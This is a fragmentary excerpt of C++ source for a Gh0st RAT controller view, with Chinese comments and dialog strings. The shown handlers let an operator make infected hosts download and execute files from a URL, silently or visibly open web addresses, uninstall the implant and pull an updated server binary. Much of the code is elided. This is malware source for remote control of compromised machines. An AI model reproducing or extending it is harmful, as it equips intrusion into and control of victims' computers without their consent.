...
void CGh0stView::OnInitialUpdate()
{
	...
	for (int i = 0; i < g_Column_Count; i++)
	{
		...
		g_Column_Width += g_Column_Data[i].nWidth; // 總寬度
	}
...
LRESULT CGh0stView::OnMyInitialUpdate(WPARAM, LPARAM)
{
	...
	// Add Build Window
	//對於CFormView派生類必須新生成對象而不能使用成員對象
	CBuildView *pBuildView = new CBuildView;
	//由於CFormView的成員受保護，所以必須對指針進行強制轉換
...
void CGh0stView::OnDownexec() 
{
	...
	CInputDialog	dlg;
	dlg.Init(_T("下載者"), _T("請輸入要下載文件的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("輸入的網址不合法", "錯誤");
		return;
	}
...
{
	// TODO: Add your command handler code here
	if (MessageBox("確認卸載服務端嗎 -:)", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
...
void CGh0stView::OnOpenUrlHide() 
{
	...
	CInputDialog	dlg;
	dlg.Init(_T("遠程訪問網址"), _T("請輸入要隱藏訪問的網址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
...
void CGh0stView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("遠程訪問網址"), _T("請輸入要顯示訪問的網址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
...
void CGh0stView::OnRenameRemark() 
{
	...
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format("更改主機(%s)的備註", m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
	else
		strTitle = "批量更改主機備註";
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("請輸入新的備註:"), this);
...
void CGh0stView::OnUpdateServer() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("下載更新服務端"), _T("請輸入要下載新服務端的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
